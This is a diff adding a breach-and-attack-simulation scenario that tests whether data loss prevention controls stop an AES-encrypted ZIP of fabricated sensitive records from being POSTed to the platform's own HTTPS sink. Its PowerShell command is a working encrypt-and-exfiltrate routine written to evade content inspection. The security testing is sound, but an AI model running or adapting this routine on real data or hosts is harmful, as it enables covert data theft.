@@ -1,0 +1,89 @@
+id: dlp-exfiltration-archive-encrypted
+name: DLP Exfiltration Validation — Encrypted Archive Upload over HTTPS Sink
+description: >
+  Packs the synthetic multi-type sensitive record into a ZIP, encrypts the ZIP
+  with AES-256 under a random key that is discarded at once, and POSTs the
+  ciphertext to this platform's own HTTPS sink, which is sink-verified by token.
+
+  This tests whether an outbound control allows an encrypted container to leave
+  the endpoint. It does not test content inspection. The content is encrypted
+  before it leaves, so a DLP product that cannot decrypt it cannot find the
+  regulated patterns. A receipt therefore shows that encrypted content was not
+  stopped. It does not show that the plaintext was inspected.
+
+  Not built: password-protected ZIP. PowerShell cannot create one without an
+  external tool such as 7-Zip, which this repository does not provision.
+  Also not built: OCR, where an image of the record is transferred. That needs
+  an image rendering path that this scenario does not have.
+
+  Evidence level: L2. The verdict comes from the sink receipt, which is the
+  destination's own record of the request.
+
+  Safety: all synthetic data is fabricated and tagged [BAS-SIM-DLP]. The
+  random key exists only in memory and is never written or sent. The sink
+  stores only a hash of the payload. The temp folder is removed in a finally
+  block. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - archive
+  - encryption
+  - windows
+  - mitre-attack
+mitre_phases:
+  - collection
+  - exfiltration
+
+steps:
+  - name: "DLP Validation — AES-Encrypted ZIP Archive Upload over HTTPS Sink (T1027)"
+    technique_id: T1027
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Creates a small ZIP and an AES-encrypted copy in a private temp folder, POSTs the ciphertext's base64 bytes to the platform's own sink over HTTPS, then deletes the folder. No real data, no external destination."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: powershell.exe Compress-Archive and AES activity"
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS POST whose body is an encrypted archive from an endpoint with no decryption path"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $work = Join-Path $env:TEMP ("bas_sim_encarc_" + [guid]::NewGuid().ToString('N'))
+      try {
+        New-Item -ItemType Directory -Path $work -Force | Out-Null
+        $src = Join-Path $work "bas-sim-record.csv"
+        $zip = Join-Path $work "bas-sim-record.zip"
+        Set-Content -Path $src -Value $csvContent -Encoding utf8
+        Compress-Archive -Path $src -DestinationPath $zip -Force
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.KeySize = 256
+        $aes.GenerateKey()
+        $aes.GenerateIV()
+        $enc = $aes.CreateEncryptor()
+        $plain = [IO.File]::ReadAllBytes($zip)
+        $cipher = $enc.TransformFinalBlock($plain, 0, $plain.Length)
+        $blob = $aes.IV + $cipher
+        $aes.Clear()
+        $b64 = [Convert]::ToBase64String($blob)
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$b64; channel='archive-encrypted'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "EXEC T1027: AES-encrypted ZIP archive of the sensitive record POSTed over HTTPS. [BAS-SIM-DLP-ARCHIVE-ENC]"
+      } catch {
+        Write-Output "EXEC T1027: encrypted archive transfer to sink was blocked or failed before completing. [BAS-SIM-DLP-ARCHIVE-ENC]"
+      } finally {
+        Remove-Item -Path $work -Recurse -Force -ErrorAction SilentlyContinue
+      }
+      # No local DLP_OBSERVATION marker: the verdict comes from the sink receipt.
+    cleanup: ""
